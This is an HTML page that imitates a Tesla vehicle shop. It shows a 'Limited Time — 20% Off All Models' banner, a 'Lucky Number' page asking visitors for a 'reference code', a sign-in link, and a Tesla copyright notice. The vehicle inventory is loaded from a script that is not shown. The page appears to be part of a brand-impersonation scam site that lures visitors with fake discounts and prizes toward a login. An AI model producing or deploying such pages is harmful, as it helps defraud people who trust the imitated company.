<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Tesla — Shop Vehicles</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="style.css"/>
</head>
<body>

<!-- ── NAV ─────────────────────────────────────────────────── -->
<nav id="navbar" class="scrolled">
  <a class="nav-logo" href="index.html">TESL<span>A</span></a>
  <div class="nav-links">
    <a href="shop.html" style="color:var(--white)">Vehicles</a>
    <a href="prize.html">Lucky Number</a>
    <a href="about.html">About</a>
  </div>
  <div class="nav-right">
    <a href="login.html" id="nav-login">Sign In</a>
    <a href="dashboard.html" id="nav-dash" style="display:none">Dashboard</a>
    <button class="btn btn-outline" id="nav-logout" style="display:none;padding:.4rem 1rem;font-size:.75rem;">Sign Out</button>
  </div>
</nav>

<!-- ── SHOP HERO ─────────────────────────────────────────────── -->
<div style="padding-top:var(--nav-h);background:linear-gradient(180deg,#111 0%,#0a0a0a 100%);">
  <div class="container" style="padding-top:3rem;padding-bottom:3rem;text-align:center;">
    <div style="display:inline-block;padding:.3rem .9rem;border:1px solid var(--red);border-radius:99px;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;color:var(--red);margin-bottom:1.2rem;">🔥 Limited Time — 20% Off All Models</div>
    <h1 class="section-title">Electric Vehicles</h1>
    <p class="section-sub">Choose your Tesla. All prices include exclusive discount.</p>
  </div>
</div>

<!-- ── INVENTORY GRID ────────────────────────────────────────── -->
<section style="padding-top:2rem;">
  <div class="container">
    <div class="grid-3" id="inventory-grid">
      <!-- Cards injected by JS -->
      <div style="text-align:center;padding:4rem;color:var(--gray-400);grid-column:1/-1;">Loading vehicles…</div>
    </div>
  </div>
</section>

<!-- ── LUCKY BANNER ──────────────────────────────────────────── -->
<section style="text-align:center;padding:4rem 0;">
  <div class="container">
    <p class="section-sub">Have a reference code?</p>
    <h2 class="section-title mt-2">Try Your Lucky Number</h2>
    <a href="prize.html" class="btn btn-gold mt-6" style="padding:.9rem 2.5rem;">Enter Code →</a>
  </div>
</section>

<footer>
  <div class="container">
    <p>© 2025 Tesla, Inc. All rights reserved.</p>
  </div>
</footer>

<script type="module">
  import { initNav, initShop } from './main.js';
  initNav();
  initShop();
</script>
</body>
</html>
